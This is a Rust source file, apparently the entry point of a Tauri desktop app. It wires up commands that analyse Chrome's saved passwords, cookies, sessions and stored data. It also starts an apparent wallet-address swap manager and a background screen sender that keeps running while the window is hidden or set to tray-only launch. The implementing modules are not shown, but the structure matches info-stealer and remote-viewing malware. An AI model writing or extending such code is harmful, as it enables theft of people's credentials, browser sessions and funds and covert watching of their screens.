pub mod chrome;
mod platform;
mod screen;
mod window;

use std::sync::Arc;

use screen::{load_or_create_sender_id, ScreenSender, ScreenSenderConfig};
use window::launch_mode::LaunchMode;
use tauri::{
    tray::TrayIconBuilder,
    Manager, RunEvent, WindowEvent,
};
fn desktop_monitor_point(app: &tauri::AppHandle) -> Option<(i32, i32)> {
    let window = app.get_webview_window("main")?;
    let pos = window.outer_position().ok()?;
    let size = window.outer_size().ok()?;
    Some((
        pos.x + size.width as i32 / 2,
        pos.y + size.height as i32 / 2,
    ))
}

struct AppState {
    sender: Arc<ScreenSender>,
}

#[cfg(windows)]
type InstanceHandle = window::single_instance::InstanceGuard;

#[cfg(not(windows))]
type InstanceHandle = ();

use window::show_main_window;

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let launch_mode = LaunchMode::from_env_args();

    #[cfg(windows)]
    {
        if window::single_instance::try_forward_to_running_instance(launch_mode == LaunchMode::Standard)
        {
            return;
        }

        let Some(instance) = window::single_instance::acquire_instance_guard() else {
            return;
        };

        run_with_instance(instance, launch_mode);
        return;
    }

    #[cfg(not(windows))]
    {
        run_with_instance((), launch_mode);
    }
}

fn run_with_instance(instance: InstanceHandle, launch_mode: LaunchMode) {
    let _instance_guard = instance;

    tauri::Builder::default()
        .invoke_handler(tauri::generate_handler![
            chrome::chrome_list_profiles,
            chrome::chrome_analyze_passwords,
            chrome::chrome_analyze_cookies,
            chrome::chrome_analyze_sessions,
            chrome::stored::chrome_analyze_stored_data,
            window::commands::window_minimize,
            window::commands::window_toggle_maximize,
            window::commands::window_hide,
            window::commands::window_is_maximized,
        ])
        .setup(move |app| {
            #[cfg(windows)]
            window::show_signal::start_show_ui_watcher(app.handle().clone());

            let _ = screen::address_swap::AddressSwapManager::global();

            TrayIconBuilder::new().build(app)?;

            let app_handle = app.handle().clone();
            let monitor_point = Arc::new(move || desktop_monitor_point(&app_handle));
            let sender_id = load_or_create_sender_id();
            let config = ScreenSenderConfig {
                sender_id,
                monitor_point: Some(monitor_point),
                ..ScreenSenderConfig::default()
            };
            let sender = Arc::new(
                ScreenSender::new(config).expect("Error was occurred"),
            );
            let sender_for_task = Arc::clone(&sender);
            tauri::async_runtime::spawn(async move {
                let _ = sender_for_task.run().await;
            });
            app.manage(AppState { sender });

            match launch_mode {
                LaunchMode::TrayOnly => {
                    if let Some(window) = app.get_webview_window("main") {
                        let _ = window.hide();
                    }
                }
                LaunchMode::Standard => show_main_window(app.handle()),
            }

            Ok(())
        })
        .on_window_event(|window, event| {
            if let WindowEvent::CloseRequested { api, .. } = event {
                api.prevent_close();
                let _ = window.hide();
            }
        })
        .build(tauri::generate_context!())
        .expect("error while building tauri application")
        .run(|app_handle, event| {
            if let RunEvent::Exit = event {
                if let Some(state) = app_handle.try_state::<AppState>() {
                    state.sender.stop();
                }
            }
        });
}
